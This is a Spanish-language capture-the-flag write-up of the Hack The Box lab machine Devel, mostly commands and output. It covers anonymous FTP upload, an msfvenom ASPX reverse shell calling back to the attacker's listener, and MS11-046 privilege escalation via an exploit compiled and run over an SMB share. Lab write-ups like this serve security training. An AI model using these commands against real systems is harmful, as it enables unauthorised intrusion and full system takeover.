---
layout: single
title: <span style="color:#35BAE9">Devel </span><span class="en_blanco">-</span><span class="htb"> Hack The Box </span><span class="en_blanco">- </span><span class="es_rojo">E</span><span class="es_amarillo">S</span><span class="es_rojo">P</span>
excerpt: "En este post realizaremos el write up de la máquina Devel. Tocaremos los conceptos de conexión por ftp con las credenciales anonymous:anonymous, crearemos una reverse shell en formato aspx utilizando
msfvenom y escalaremos privilegios a través de la vulnerabilidad CVE-2011-1249 bautizada como MS11-046."
date: 2022-09-04
classes: wide
header:
  teaser: /assets/images/Devel/devel.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - Hack The Box
  - Easy
  - Esp
tags:
  - FTP Anonymous
  - ASPX
  - Msfvenom
  - CVE-2011-1249
  - MS11-046
---


## DESCRIPCION   


En este post realizaremos el write up de la máquina Devel. Tocaremos los conceptos de conexión por ftp con las credenciales anonymous:anonymous, crearemos una reverse shell en formato aspx utilizando 
msfvenom y escalaremos privilegios a través de la vulnerabilidad CVE-2011-1249 bautizada como MS11-046.

![](/assets/images/Devel/devel_descripcion.png)

## INDICE

- [Reconocimiento de puertos](#escaneo-de-puertos)
- [FTP](#ftp)
- [Intrusion](#intrusion)
	- [Creacion de la revshell](#crear)
	- [Subir revshell por ftp](#subir)
	- [Recibir la conexion](#conexion)
- [Escalada de privilegios](#escalada-de-privilegios)
- [Flags](#flags)
- [Conocimientos obtenidos](#conocimientos-obtenidos)
- [Errores](#errores)
- [Autores y referencias](#autores-y-referencias)


## ESCANEO DE PUERTOS
<br>
Escaneamos con `nmap` los puertos abiertos en la máquina Devel:

```ruby
❯ cat Puertos
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: Puertos
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ nmap --open -p- -T5 -oG Puertos 10.10.10.5
   2   │ Host: 10.10.10.5 () Status: Up
   3   │ Host: 10.10.10.5 () Ports: 21/open/tcp//ftp///, 80/open/tcp//http///    Ignored State: filtered (65533)
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ Reconocimiento Puertos

{*} Extrayendo puertos...

	La direccion ip es: 10.10.10.5
	Los puertos abiertos son: 21,80

	Los puertos han sido copiados al portapapeles
```
<br>
Escaneamos al objetivo con los scripts predeterminados de nmap, apuntando a los puertos abiertos en busca de más información.

```ruby
❯ cat Objetivos
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: Objetivos
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ nmap -sCV -p 21,80 -oN Objetivos 10.10.10.5
   2   │ Nmap scan report for 10.10.10.5
   3   │ Host is up (0.053s latency).
   4   │ 
   5   │ PORT   STATE SERVICE VERSION
   6   │ 21/tcp open  ftp     Microsoft ftpd
   7   │ | ftp-syst: 
   8   │ |_  SYST: Windows_NT
   9   │ | ftp-anon: Anonymous FTP login allowed (FTP code 230)
  10   │ | 03-18-17  02:06AM       <DIR>          aspnet_client
  11   │ | 03-17-17  05:37PM                  689 iisstart.htm
  12   │ |_03-17-17  05:37PM               184946 welcome.png
  13   │ 80/tcp open  http    Microsoft IIS httpd 7.5
  14   │ |_http-title: IIS7
  15   │ | http-methods: 
  16   │ |_  Potentially risky methods: TRACE
  17   │ |_http-server-header: Microsoft-IIS/7.5
  18   │ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

```
Podemos observar que tenemos acceso al ftp por `anonymous:anonymous` y que el servidor web está utilizando `Microsoft IIS 7.5`, 
<a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services" target="_blank">Hacktricks</a>.

## FTP
<br>
Si accedemos por ftp con las credenciales `anonymous:anonymous` parece ser que estamos en la ruta donde se aloja el contenido del servidor web.

```bash
❯ ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:void4m0n): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
229 Entering Extended Passive Mode (|||49169|)
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png

```

Tenemos permisos de escritura, por lo que podríamos intentar subir una reverse shell.

## INTRUSION

<h3 style="text-align:center" id="crear">CREACION DE LA REVSHELL</h3>
<br>
De primeras intenté hacer uso de `php-reverse-shell.php`, pero por lo que parece el servidor lo tenía contemplado y no dejaba acceder a ella mediante el buscador, por lo que recurrí a 
`msfvenom` para crear una reverse shell en formato ejecutable `aspx`.

```bash
❯ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.2 LPORT=1234 -f aspx > revshell.aspx
```

<h3 style="text-align:center" id="subir">SUBIR REVSHELL POR FTP</h3>
<br>
Subimos `revshell.aspx` por ftp.

```bash
ftp> put revshell.aspx 
local: revshell.aspx remote: revshell.aspx
229 Entering Extended Passive Mode (|||49178|)
125 Data connection already open; Transfer starting.
100% |****************************|  2739       28.39 MiB/s    --:-- ETA
226 Transfer complete.
2739 bytes sent in 00:00 (18.83 KiB/s)

```
<h3 style="text-align:center" id="conexion">RECIBIR LA CONEXION</h3>
<br>
1 - Nos ponemos por escucha en el puerto indicado, haciendo uso de `rlwrap` para disponer de una shell más interactiva.
```bash
❯ rlwrap nc -lvnp 1234
listening on [any] 1234 ...
```
<br>
2 - Hacemos una petición por `GET` a `revshell.aspx`.

```bash
curl -s -X GET "http://10.10.10.5/revshell.aspx"
```
<br>
3 - Recibimos la conexión.

```shell
❯ rlwrap nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.10.5] 49181
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>
```

## ESCALADA DE PRIVILEGIOS
<br>
Una vez tenemos la shell, hacemos `systeminfo` para observar a que nos enfrentamos.

```
Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
Registered Organization:   
Product ID:                55041-051-0948536-86302
Original Install Date:     17/3/2017, 4:17:31 
System Boot Time:          5/9/2022, 12:03:54 
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     3.071 MB
Available Physical Memory: 2.504 MB
Virtual Memory: Max Size:  6.141 MB
Virtual Memory: Available: 5.576 MB
Virtual Memory: In Use:    565 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Local Area Connection 3
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.5
                                 [02]: fe80::58c0:f1cf:abc6:bb9e
                                 [03]: dead:beef::85fa:bd6b:8264:8a30
                                 [04]: dead:beef::58c0:f1cf:abc6:bb9e

```

Nos fijamos en `OS Name: Microsoft Windows 7 Enterprise` y `OS Version: 6.1.7600 N/A Build 7600`.

Haciendo una pequeña búsqueda encontramos el siguiente exploit en <a href="https://www.exploit-db.com/exploits/40564" target="_blank">Exploit-db</a>.

1 - Descargamos el script.

```bash
❯ wget -O MS11-046-Privesc.c https://www.exploit-db.com/raw/40564
--2022-09-05 00:21:50--  https://www.exploit-db.com/raw/40564
Resolviendo www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
Conectando con www.exploit-db.com (www.exploit-db.com)[192.124.249.13]:443... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: no especificado [text/plain]
Grabando a: «MS11-046-Privesc.c»

MS11-046-Privesc.c                                      [ <=>                                                                                                               ]  31,91K  --.-KB/s    en 0,03s   

2022-09-05 00:21:51 (980 KB/s) - «MS11-046-Privesc.c» guardado [32674]

```
<br>
2 - Compilamos en formato `.exe`.

```bash
❯ i686-w64-mingw32-gcc -o MS11-046-Privesc.exe MS11-046-Privesc.c -lws2_32
```
<br>
3 - Para compartirnos el ejecutable nos montamos un servidor smb en el directorio de trabajo.

```bash
❯ impacket-smbserver smbfolder .
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

```
<br>
4 - Desde la máquina víctima llamamos al ejecutable por smb.

```bash
c:\windows\system32\inetsrv>//10.10.16.2/SMBFOLDER/MS11-046-Privesc.exe

c:\Windows\System32>whoami
nt authority\system

```
¡Somos nt authority\system!

## FLAGS

<h3>User.txt</h3>

```bash
Directory of c:\Users\babis\Desktop

type user.txt
7b20xxxxxxxxxxxxxxxxxxxxxxxxxxxx
```
<h3>Root.txt</h3>

```bash
Directory of c:\Users\Administrator\Desktop

type root.txt
5968xxxxxxxxxxxxxxxxxxxxxxxxxxxx
```
## CONOCIMIENTOS OBTENIDOS;
<br>
De la máquina <em>Devel</em> podemos extraer los siguientes conocimientos:

- Reconocimiento de puertos con nmap.
- Conexion por ftp con credenciales anonymous:anonymous.
- Reverse shell .aspx.
- Compartir recursos por smb.
- Compilar script en c a .exe en linux.

## ERRORES
<br>
Un posible error que podéis sufrir es el siguiente:
- Si el exploit falla a la hora de escalar privilegios recordad que a la hora de compilar el script se debe usar el parámetro `-lws2_32`.

## AUTORES y REFERENCIAS
<br>
Autor del write up: Luis Miranda Sierra (Void4m0n) <a href="https://app.hackthebox.com/profile/1104062" target="_blank">HTB</a>. Si queréis contactarme por cualquier motivo lo podéis hacer a través 
de <a href="https://twitter.com/Void4m0n" target="_blank">Twitter</a>.


Autor de la máquina:  <em>ch4p</em>, muchas gracias por la creación de Devel aportando a la comunidad. <a href="https://app.hackthebox.com/users/1" target="_blank">HTB</a>.
